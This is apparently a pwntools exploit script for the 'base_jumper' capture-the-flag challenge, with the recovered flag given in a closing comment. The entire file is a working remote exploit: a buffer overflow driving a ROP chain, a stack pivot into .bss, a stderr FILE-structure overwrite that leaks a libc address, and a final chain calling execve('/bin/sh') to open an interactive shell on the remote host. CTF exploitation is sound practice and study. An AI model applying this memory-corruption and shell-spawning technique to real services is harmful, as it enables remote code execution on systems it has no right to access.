from pwn import *

HOST = "basejumper.3k.ctf.to"
PORT = 3147
elf = ELF("base_jumper")
p = remote(HOST, PORT)

# PLT functions
fgets_plt = elf.plt['fgets']
main = elf.sym['main']
entry = 0x400550
vuln = elf.sym['vuln']
gift = 0x0000000000400637
flush_main = 0x00000000004006df

# GADGETS
pop_rdi = 0x0000000000400763
ret = 0x000000000040050e
pop_rsi_r15 = 0x0000000000400761
pop_rbp = 0x00000000004005b8
leave_ret = 0x0000000000400666

# BSS & GOT
stderr = 0x601040
bss = 0x601040
fgets_got = 0x0000000000600fd8

period = 0.2
sec_pivot = bss + 0x900

payload = b""
payload += b"A" * 18
payload += p64(pop_rdi)
payload += p64(stderr - 8)
payload += p64(pop_rsi_r15)
payload += p64(8)
payload += p64(0)
payload += p64(gift)
payload += p64(fgets_plt)  # A

payload += p64(pop_rdi)
payload += p64(stderr + 8)
payload += p64(pop_rsi_r15)
payload += p64(0x200)
payload += p64(0)
payload += p64(gift)
payload += p64(fgets_plt)  # flush stdin

payload += p64(pop_rdi)
payload += p64(stderr + 8)
payload += p64(pop_rsi_r15)
payload += p64(0x200)
payload += p64(0)
payload += p64(gift)
payload += p64(fgets_plt)  # B

payload += p64(pop_rdi)
payload += p64(sec_pivot)
payload += p64(pop_rsi_r15)
payload += p64(0x200)
payload += p64(0)
payload += p64(gift)
payload += p64(fgets_plt)  # C

payload += p64(pop_rbp)
payload += p64(stderr - 16)
payload += p64(leave_ret)

p.sendline(payload)  # jaweb main

sleep(period)
p.sendline(p64(pop_rdi))  # jaweb A
sleep(period)

payload = b""
payload += p64(pop_rbp)
payload += p64(sec_pivot - 8)
payload += p64(leave_ret)

p.sendline(payload)  # jaweb B
sleep(period)

payload = b""
payload += p64(pop_rsi_r15)
payload += p64(8 * 6)
payload += p64(0)
payload += p64(gift)
payload += p64(fgets_plt)  # D
payload += p64(flush_main)
payload += p64(vuln)
payload += p64(vuln) * 2
p.sendline(payload)  # jaweb C

payload = b""
payload += p64(0xfbad1800)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(fgets_got)
payload += p64(fgets_got + 8)
p.sendline(payload)  # jaweb D

data = u64(p.recv())

base = data - 0x000000000007eb90
execve = base + 0x00000000000e4e90
binsh = base + 0x1b40fa
pop_rdx_libc = base + 0x0000000000001b96
pop_rsi_libc = base + 0x0000000000023e8a
log.success("leak --> %s" % hex(data))
log.success("base --> %s" % hex(base))
log.success("execve --> %s" % hex(execve))
log.success("binsh --> %s" % hex(binsh))

payload = b""
payload += b"A" * 18
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(pop_rsi_libc)
payload += p64(0)
payload += p64(pop_rdx_libc)
payload += p64(0)
payload += p64(execve)
p.sendline(payload)
log.info("spawning shell...")
sleep(1)
p.recvuntil("turned off\n")
p.interactive()

# FLAG --> 3k{base_jump_roof_jump_io_file_jumps}
